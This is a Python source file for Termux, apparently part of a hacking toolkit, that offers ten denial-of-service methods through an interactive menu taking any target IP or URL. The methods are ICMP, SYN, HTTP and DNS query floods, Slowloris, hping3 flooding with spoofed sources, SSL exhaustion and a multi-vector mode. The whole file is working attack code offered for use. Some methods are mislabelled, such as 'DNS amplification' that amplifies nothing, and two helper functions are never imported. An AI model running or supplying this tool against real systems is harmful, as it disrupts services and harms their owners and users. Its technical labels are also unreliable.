#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

"""
DDoS Attack Module - 10 Methods
Created by s3cret_proj3ct
"""

import os
import sys
import time
import socket
import random
import threading
from colorama import Fore, Style

from utils.ascii_art import get_ascii
from utils.formatters import print_section, print_menu_item, print_info

# ============================================================
# GLOBAL VARIABLES
# ============================================================
ATTACK_RUNNING = False
ATTACK_THREADS = []

# ============================================================
# ATTACK METHODS
# ============================================================

def icmp_flood(target, duration):
    """ICMP Flood - Ping flood"""
    print_info(f"Starting ICMP Flood on {target}")
    end_time = time.time() + duration
    
    while time.time() < end_time and ATTACK_RUNNING:
        os.system(f'ping -c 1 -s 65507 {target} > /dev/null 2>&1 &')

def dns_amplification(target, duration):
    """DNS Amplification Attack"""
    print_info(f"Starting DNS Amplification on {target}")
    end_time = time.time() + duration
    
    # DNS servers for amplification
    dns_servers = [
        '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9',
        '208.67.222.222', '208.67.220.220'
    ]
    
    while time.time() < end_time and ATTACK_RUNNING:
        for dns in dns_servers:
            os.system(f'dig +short @{dns} {target} > /dev/null 2>&1 &')

def syn_flood(target, duration):
    """SYN Flood Attack"""
    print_info(f"Starting SYN Flood on {target}")
    end_time = time.time() + duration
    
    try:
        target_ip = target.replace('http://', '').replace('https://', '').split('/')[0]
    except:
        target_ip = target
    
    while time.time() < end_time and ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect_ex((target_ip, 80))
            sock.close()
        except:
            pass

def ping_of_death(target, duration):
    """Ping of Death - Oversized packets"""
    print_info(f"Starting Ping of Death on {target}")
    end_time = time.time() + duration
    
    try:
        target_ip = target.replace('http://', '').replace('https://', '').split('/')[0]
    except:
        target_ip = target
    
    while time.time() < end_time and ATTACK_RUNNING:
        os.system(f'ping -s 65535 -c 1 {target_ip} > /dev/null 2>&1 &')

def fragmented_packet(target, duration):
    """Fragmented Packet Attack"""
    print_info(f"Starting Fragmented Packet Attack on {target}")
    end_time = time.time() + duration
    
    try:
        target_ip = target.replace('http://', '').replace('https://', '').split('/')[0]
    except:
        target_ip = target
    
    while time.time() < end_time and ATTACK_RUNNING:
        os.system(f'hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source {target_ip} > /dev/null 2>&1 &')

def http_flood(target, duration):
    """HTTP Flood Attack"""
    print_info(f"Starting HTTP Flood on {target}")
    end_time = time.time() + duration
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
    ]
    
    while time.time() < end_time and ATTACK_RUNNING:
        ua = random.choice(user_agents)
        os.system(f'curl -s -A "{ua}" {target} > /dev/null 2>&1 &')

def slowloris(target, duration):
    """Slowloris Attack"""
    print_info(f"Starting Slowloris on {target}")
    end_time = time.time() + duration
    
    try:
        target_ip = target.replace('http://', '').replace('https://', '').split('/')[0]
    except:
        target_ip = target
    
    sockets = []
    
    while time.time() < end_time and ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, 80))
            
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(['Mozilla/5.0', 'curl/7.68.0'])}\r\n"
            sock.send(request.encode())
            sockets.append(sock)
            
            for s in sockets[:]:
                try:
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
            
            time.sleep(5)
        except:
            pass

def dns_query_flood(target, duration):
    """DNS Query Flood"""
    print_info(f"Starting DNS Query Flood on {target}")
    end_time = time.time() + duration
    
    while time.time() < end_time and ATTACK_RUNNING:
        os.system(f'nslookup {target} > /dev/null 2>&1 &')

def ssl_exhaustion(target, duration):
    """SSL/TLS Exhaustion"""
    print_info(f"Starting SSL Exhaustion on {target}")
    end_time = time.time() + duration
    
    while time.time() < end_time and ATTACK_RUNNING:
        os.system(f'openssl s_client -connect {target}:443 -tlsextdebug -status > /dev/null 2>&1 &')

def multi_vector(target, duration):
    """Multi-Vector Attack (combines multiple methods)"""
    print_info(f"Starting Multi-Vector Attack on {target}")
    end_time = time.time() + duration
    
    methods = [icmp_flood, syn_flood, http_flood, dns_query_flood]
    
    while time.time() < end_time and ATTACK_RUNNING:
        method = random.choice(methods)
        method(target, 1)  # Run for 1 second

# ============================================================
# MAIN DDOS FUNCTION
# ============================================================
def run_ddos():
    """Main DDoS function"""
    global ATTACK_RUNNING, ATTACK_THREADS
    
    os.system('clear')
    print(get_ascii('ddos'))
    print_section("DDoS ATTACK METHODS")
    
    # Display menu
    methods = [
        ("ICMP Flood", icmp_flood),
        ("DNS Amplification", dns_amplification),
        ("SYN Flood", syn_flood),
        ("Ping of Death", ping_of_death),
        ("Fragmented Packet Attack", fragmented_packet),
        ("HTTP Flood", http_flood),
        ("Slowloris", slowloris),
        ("DNS Query Flood", dns_query_flood),
        ("SSL/TLS Exhaustion", ssl_exhaustion),
        ("Multi-Vector Attack", multi_vector)
    ]
    
    for i, (name, _) in enumerate(methods, 1):
        print_menu_item(str(i), name)
    print_menu_item("0", "Back")
    
    choice = input(f"\n{Fore.YELLOW}Select method: {Style.RESET_ALL}").strip()
    
    if choice == '0':
        return
    
    try:
        method_idx = int(choice) - 1
        if method_idx < 0 or method_idx >= len(methods):
            print_error("Invalid choice!")
            return
    except:
        print_error("Invalid choice!")
        return
    
    method_name, method_func = methods[method_idx]
    
    # Input target
    target = input(f"\n{Fore.YELLOW}Target IP/URL: {Style.RESET_ALL}").strip()
    if not target:
        print_error("Target required!")
        return
    
    # Input duration
    try:
        duration = int(input(f"{Fore.YELLOW}Duration (seconds): {Style.RESET_ALL}"))
        if duration <= 0:
            duration = 30
    except:
        duration = 30
    
    print_info(f"Starting {method_name} attack on {target}")
    print_info(f"Duration: {duration} seconds")
    print_warning("Press Ctrl+C to stop")
    
    ATTACK_RUNNING = True
    
    # Start attack thread
    attack_thread = threading.Thread(target=method_func, args=(target, duration))
    attack_thread.start()
    
    # Monitor
    try:
        start_time = time.time()
        while attack_thread.is_alive() and ATTACK_RUNNING:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            if remaining <= 0:
                break
            sys.stdout.write(f'\r{Fore.CYAN}Time remaining: {remaining}s{Style.RESET_ALL}')
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        ATTACK_RUNNING = False
        print(f"\n\n{Fore.RED}Attack stopped by user{Style.RESET_ALL}")
    
    print(f"\n\n{Fore.GREEN}Attack completed{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
